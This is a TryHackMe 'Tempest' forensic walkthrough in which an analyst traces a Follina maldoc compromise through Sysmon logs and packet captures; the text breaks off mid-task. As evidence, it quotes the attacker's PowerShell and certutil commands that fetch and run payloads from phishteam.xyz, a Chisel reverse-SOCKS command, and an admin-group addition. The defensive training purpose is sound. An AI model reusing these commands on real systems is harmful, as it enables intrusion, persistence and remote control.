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TryHackMe — Tempest Writeup</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>AbbasMurshid</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Follow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>11 min read</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>·</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Feb 11, 2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>I am Not Forensic Person i just compeleting my SOC Analyst part using my analyst knowledge if you wantgood write ups you may visit other</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>I completed some question are by using hint and seek helped by others</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Room Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This room aims to introduce the process of analysing endpoint and network logs from a compromised asset. Given the artefacts, we will aim to uncover the incident from the Tempest machine. In this scenario, you will be tasked to be one of the Incident Responders that will focus on handling and analysing the captured artefacts of a compromised machine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Before starting the investigation, let’s look at the tools used during the analysis.</w:t>
        <w:br/>
        <w:t>TASK 2 : Toolset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The toolset needed for this task is focused on analysing Sysmon Logs, Windows Event Logs, and Packet Capture.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Endpoint Log Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>To analyse Windows artefacts such as Windows Event Logs and Sysmon logs, we will use the following tools:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>EvtxEcmd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Timeline Explorer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>SysmonView</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Event Viewer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Network Traffic Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>To analyse the provided packet capture, we will use the following tools:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Brim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>TASK 3 :</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>— — Task 3 — -</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The first three questions can be solved using a simple PowerShell ForEach loop.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>$Files = Get-ChildItem 'C:\Users\user\Desktop\Incident Files'</w:t>
        <w:br/>
        <w:t>ForEach($File in $Files)</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t>Get-FileHash $File -Algorithm SHA256</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q1 : What is the SHA256 hash of the capture.pcapng file?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>value is : CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6</w:t>
        <w:br/>
        <w:t>Q 2 : What is the SHA256 hash of the sysmon.evtx file?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F</w:t>
        <w:br/>
        <w:t>Q 3 : What is the SHA256 hash of the windows.evtx file?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Value is D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>TASK 2 :</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q1 : The user of this machine was compromised by a malicious document. What is the file name of the document?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>to see that we so i list what are the process are created in the vent by using sysmon view so i inject sysmon xml file into tool to see</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Interestingly, the process tree showed multiple chrome.exe processes being created.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>I then checked the process details for further investigation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>its show process id is “6596" i noted which it help to filter in timeline explorer tool or we can use sysmon id 15 to filter out the downloaded file</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Using the identified process ID as the parent process, I found another related event.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>lets see what document are downloaded file by viewing executable info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>we can see the file name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : free_magicules.doc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q2 : What is the name of the compromised user and machine?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>we can see column in timeviewer “username and Computer”</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>using that</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : benimaru-TEMPEST</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q3 : What is the PID of the Microsoft Word process that opened the malicious document?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>we already know file name using the file i filter it in timeviewer to see process PID and use sysmon id 1 for process creation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>I use filename to filter process in tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>after filter out we only see one event left file was opened by WINWORD.exe process</w:t>
        <w:br/>
        <w:t>PROCESS ID</w:t>
        <w:br/>
        <w:t>ANS : 496</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q4 : Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>We know the URL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>using this domain i search DNS query in timeviewer to get exam this domain query</w:t>
        <w:br/>
        <w:t>using</w:t>
        <w:br/>
        <w:t>SYSMON ID 22</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>we can several query performed to domain phishteam.xyz</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>to see query result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>we get IP Address : 167.71.199.191</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q5 : What is the base64 encoded string in the malicious payload executed by the document?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>we know the WINWORD process id = 496 are executed malicous document</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>using this process as parent process filter out what are the thing are executed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>lets what it executed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>its seem attacker use Base64 payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Q6 : What is the CVE number of the exploit used by the attacker to achieve a remote code execution?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CVE-2022–30190 — “Follina”</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Why this fits your scenario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Follina is the classic case where:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A Word document (WINWORD.EXE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Triggers remote code execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Without macros</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>And spawns PowerShell / cmd / mshta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>WINWORD.EXE</w:t>
        <w:br/>
        <w:t>└── msdt.exe</w:t>
        <w:br/>
        <w:t>└── powershell.exe</w:t>
        <w:br/>
        <w:t>└── network connection + file drop</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS: 2022–30190</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>TASK 2 : Lets move to</w:t>
        <w:br/>
        <w:t>STAGE 2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q1 : The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Payload write location (from execution)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Decoded PowerShell (key lines):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>$app = [Environment]::GetFolderPath('ApplicationData')</w:t>
        <w:br/>
        <w:t>cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"</w:t>
        <w:br/>
        <w:t>iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>What this means</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>[Environment]::GetFolderPath('ApplicationData')</w:t>
        <w:br/>
        <w:t>→ resolves to AppData\Roaming</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The attacker changes directory to the user’s Startup folder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>update.zip is written directly there</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS: C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 2 : The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?Thanks to TryHackMe and our investigation so far we know the following:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The Autostart execution reflects explorer.exe as its parent process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The target user, as per the path is benimaru</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Filtering on these (parent process = explorer, user = benimaru and EventId = 1) we are left with the following:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Answer: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f ‘http[://]phishteam[.]xyz/02dcf07/first.exe’ C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q3 : Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>we know powershell are executed the file first.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>filter by powershell as a parent process and using filename filter in command line</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 4 : The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>we know the executable filename first.exe already, using this as IMAGE name and event id 22 which is DNS query to filter out DNS Request</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : resolvecyber.xyz:80</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>TASK 6 :</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q1 : What is the URL of the malicious payload embedded in the document?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>By using wireshark i extract the URL request of malicious document</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>http://phishteam.xyz/02dcf07/free_magicules.doc</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>we already know host contact C2 ip address</w:t>
        <w:br/>
        <w:t>167.71.199.191</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>using this i filter out in wirshark</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>http and http.request.method==”GET” and ip.addr==167.71.199.191</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>its show several files downloaded from c2</w:t>
        <w:br/>
        <w:t>but here we can second payload index.html was downloaded after the malicious document</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 2 : What is the encoding used by the attacker on the c2 connection?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>phishteam.xyz in this domain we didnt see any encoded used in uri path</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>so we know another C2 domain are contacted by stage 2 payload using that</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>lets see any encoded uri used</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>http.host==”resolvecyber.xyz” and http.request.method==”GET”</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>we can lot of encoded uri requested lets what encode attacker use</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>they used</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS: base64</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 3 : The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : q</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q4 : The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : /9ab62b5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 4 : What is the HTTP method used by the binary?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : GET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 5 : Based on the user agent, what programming language was used by the attacker to compile the binary?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : nim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>TASK 7 :</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 1 : The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>then i extract all encoded parameter value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>using AI check any anomaly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>so we found that password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : infernotempest</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 2 : The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>From the decoded netstat -ano -p tcp output you provided earlier, these were the LISTENING ports on the compromised host:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>0.0.0.0:135      LISTENING</w:t>
        <w:br/>
        <w:t>0.0.0.0:445      LISTENING</w:t>
        <w:br/>
        <w:t>0.0.0.0:5040     LISTENING</w:t>
        <w:br/>
        <w:t>0.0.0.0:5357     LISTENING</w:t>
        <w:br/>
        <w:t>0.0.0.0:5985     LISTENING</w:t>
        <w:br/>
        <w:t>0.0.0.0:7680     LISTENING</w:t>
        <w:br/>
        <w:t>0.0.0.0:47001    LISTENING</w:t>
        <w:br/>
        <w:t>0.0.0.0:49664-49676 (multiple high RPC ports)</w:t>
        <w:br/>
        <w:t>192.168.254.107:139 LISTENING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ort Enumerated for Remote Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>✅ Port 5985 — WinRM (Windows Remote Management)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>0.0.0.0:5985  LISTENING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This is the most likely remote shell entry point.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Why?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Port 5985 = WinRM over HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Used for:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>PowerShell Remoting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Remote command execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Lateral movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Commonly abused by attackers after credential compromise</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Given you found:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Plaintext credentials (infernotempest)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>PowerShell usage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Recon commands</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>👉 WinRM (5985) is the prime remote shell candidate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : 5985</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 3 : The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>From the decoded traffic you shared, the attacker downloaded:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The file name ch.exe and the size (~8 MB) strongly indicate it is Chisel (a common reverse SOCKS tunneling tool).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>using ch.exe filter in timeline explorer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>we can see the command executed by tage 2 payload first.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : C:\Users\benimaru\Downloads\ch.exe” client 167.71.199.191:8080 R:socks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 4 : What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 5 : What is the name of the tool used by the attacker based on the SHA256 hash?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : chisel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 6 : The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to</w:t>
        <w:br/>
        <w:t>authenticate?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : WinRM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>TASK 8 :</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 1 : After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>another executable file are downloaded</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>name called “spf.exe”</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 2 : Based on the SHA256 hash of the binary, what is the name of the tool used?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : PrintSpoofer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 3: The tool exploits a specific privilege owned by the user. What is the name of the privilege?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : SeImpersonatePrivilege</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 4 : Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>attacker used spf.exe executed another tool name called</w:t>
        <w:br/>
        <w:t>ANS : final.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 5 : The binary connects to a different port from the first c2 connection. What is the port used?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Note: As per the exploit, the attacker is now running as system, so be sure to remove the user filter.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Let’s first filter on both network and DNS events (Event ID 3 &amp; 22) and set the Image to final.exe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : 8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>TASK 9 :</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 1 :Upon achieving SYSTEM access, the attacker then created two users. What are the account names?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>we can windows event log filter by event is 4720</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : shion,shuna</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 2: Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>attempt made becaus of /add is not in command</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : /add</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 3 : Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?</w:t>
        <w:br/>
        <w:t>ANS : 4720</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 4: The attacker added one of the accounts in the local administrator’s group. What is the command used by the attacker?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ANS : net localgroup administrators /add shion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 5: Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ANS : 4732</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Q 6: After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>lets filter out any scheduled task created in windows</w:t>
        <w:br/>
        <w:t>by using</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Press enter or click to view image in full size</w:t>
      </w:r>
    </w:p>
    <w:p/>
